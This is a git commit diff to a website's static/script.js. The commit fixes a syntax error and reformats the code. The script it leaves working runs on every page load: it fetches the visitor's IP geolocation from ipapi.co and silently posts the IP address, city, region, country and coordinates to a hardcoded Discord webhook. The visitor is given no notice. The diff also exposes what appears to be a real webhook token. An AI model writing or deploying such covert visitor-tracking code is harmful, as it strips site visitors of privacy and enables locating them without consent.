c9e99ba36a7fc1b7f2d5ea62236ed18974273563
David Rabinow <157258504+DavidRabinow@users.noreply.github.com>
2025-03-12 19:15:59 -0400

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,45 +1,49 @@
-const WEBHOOK_URL = `https://discord.com/api/webhooks/1349504538830180454/qOd1jZYQtGYOS-eIZyEcksqIcq3NOKozaV_ZJiW8Ou7KZnEx_3qfrqV1txMJQhk1emhY;
+const WEBHOOK_URL = `https://discord.com/api/webhooks/1349504538830180454/qOd1jZYQtGYOS-eIZyEcksqIcq3NOKozaV_ZJiW8Ou7KZnEx_3qfrqV1txMJQhk1emhY`;
 function sendToDiscord(ipData, locationData) {
-    const ip = ipData.query;
-    const city = ipData.city;
-    const region = ipData.region;
-    const country = ipData.country;
-    const longitude = ipData.lon;
-    const latitude = ipData.lat;
+  const ip = ipData.query;
+  const city = ipData.city;
+  const region = ipData.region;
+  const country = ipData.country;
+  const longitude = ipData.lon;
+  const latitude = ipData.lat;
 
-    let locationMessage = `Latitude: ${latitude} | Longitude: ${longitude}`;
-    let addressMessage = '';
+  let locationMessage = `Latitude: ${latitude} | Longitude: ${longitude}`;
+  let addressMessage = "";
 
-    if (locationData) {
-        const { lat, lon, address } = locationData;
-        locationMessage = `Latitude: ${lat} | Longitude: ${lon}`;
-        addressMessage = `Address: ${address}`;
-    }
+  if (locationData) {
+    const { lat, lon, address } = locationData;
+    locationMessage = `Latitude: ${lat} | Longitude: ${lon}`;
+    addressMessage = `Address: ${address}`;
+  }
 
-    const message = `\`\`\`
+  const message = `\`\`\`
 IP Address: ${ip}
 Location: ${city}, ${region}, ${country}
 ${locationMessage}
 ${addressMessage}
 \`\`\``;
 
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-    })
-    .then(response => console.log(`Sent message to Discord with status ${response.status}`))
-    .catch(error => console.error(`Error sending message to Discord: ${error}`));
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: message }),
+  })
+    .then((response) =>
+      console.log(`Sent message to Discord with status ${response.status}`)
+    )
+    .catch((error) =>
+      console.error(`Error sending message to Discord: ${error}`)
+    );
 }
 
 function sendIPData() {
-    fetch('https://ipapi.co/json')
-        .then(response => response.json())
-        .then(ipData => {
-            sendToDiscord(ipData, null); // Send IP data to Discord
-        })
-        .catch(error => console.error(`Error retrieving IP data: ${error}`));
+  fetch("https://ipapi.co/json")
+    .then((response) => response.json())
+    .then((ipData) => {
+      sendToDiscord(ipData, null); // Send IP data to Discord
+    })
+    .catch((error) => console.error(`Error retrieving IP data: ${error}`));
 }
 
 // Call the function to send IP data when the page loads
-window.onload = sendIPData; 
+window.onload = sendIPData;
